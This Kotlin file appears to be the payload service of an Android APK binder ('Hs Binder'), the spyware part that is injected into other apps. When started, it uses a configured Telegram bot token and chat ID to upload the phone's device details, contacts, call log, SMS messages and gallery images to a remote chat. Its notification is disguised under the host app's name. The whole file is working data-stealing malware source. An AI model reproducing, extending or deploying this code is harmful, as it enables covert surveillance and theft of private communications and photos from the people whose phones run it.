package Com.devhs.apkbinder.payload

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import Com.devhs.apkbinder.core.Const
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob

class PayloadService : Service(), PayloadServiceHost {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundSafely()

        val cfg = PayloadState.config
        if (cfg == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        val tg = Telegram(cfg.optString("token"), cfg.optString("chatId"))

        scope.launch {
            try {
                tg.sendMessage("Hs Binder started\nPackage: " + packageName)

                if (PayloadState.enabled("device")) {
                    tg.sendDocument("device_info.txt", Collectors.deviceInfo(this@PayloadService).toByteArray())
                }
                if (PayloadState.enabled("contacts")) {
                    tg.sendDocument("contacts.txt", Collectors.contacts(this@PayloadService).toByteArray())
                }
                if (PayloadState.enabled("calls")) {
                    tg.sendDocument("call_log.txt", Collectors.callLog(this@PayloadService).toByteArray())
                }
                if (PayloadState.enabled("sms")) {
                    tg.sendDocument("sms.txt", Collectors.sms(this@PayloadService).toByteArray())
                }
                if (PayloadState.enabled("gallery")) {
                    val items = Collectors.images(this@PayloadService, Const.IMAGE_LIMIT)
                    tg.sendMessage("Gallery items: " + items.size)
                    updateNotification(uploadingText())

                    items.chunked(Const.PARALLEL_UPLOADS).forEach { chunk ->
                        coroutineScope {
                            chunk.map { item ->
                                async(Dispatchers.IO) {
                                    val bytes = try {
                                        contentResolver.openInputStream(item.uri)?.use { it.readBytes() }
                                    } catch (_: Throwable) {
                                        null
                                    }
                                    if (bytes != null) tg.sendPhoto(item.name, bytes, Const.CAPTION)
                                }
                            }.awaitAll()
                        }
                    }
                }
                tg.sendMessage("Hs Binder finished")
            } catch (_: Throwable) {
            } finally {
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
        }
        return START_NOT_STICKY
    }

    private fun appLabel(): String = try {
        val info = packageManager.getApplicationInfo(packageName, 0)
        packageManager.getApplicationLabel(info).toString()
    } catch (_: Throwable) {
        packageName
    }

    private fun uploadingText(): String = "Uploading..."

    private fun startForegroundSafely() {
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(
            NotificationChannel(CHANNEL, appLabel(), NotificationManager.IMPORTANCE_LOW)
        )
        val notification: Notification = Notification.Builder(this, CHANNEL)
            .setContentTitle(appLabel())
            .setContentText(uploadingText())
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(ID, notification)
        }
    }

    private fun updateNotification(text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(
            ID,
            Notification.Builder(this, CHANNEL)
                .setContentTitle(appLabel())
                .setContentText(text)
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .build()
        )
    }

    companion object {
        private const val CHANNEL = "hs_payload"
        private const val ID = 0x4853
    }
}
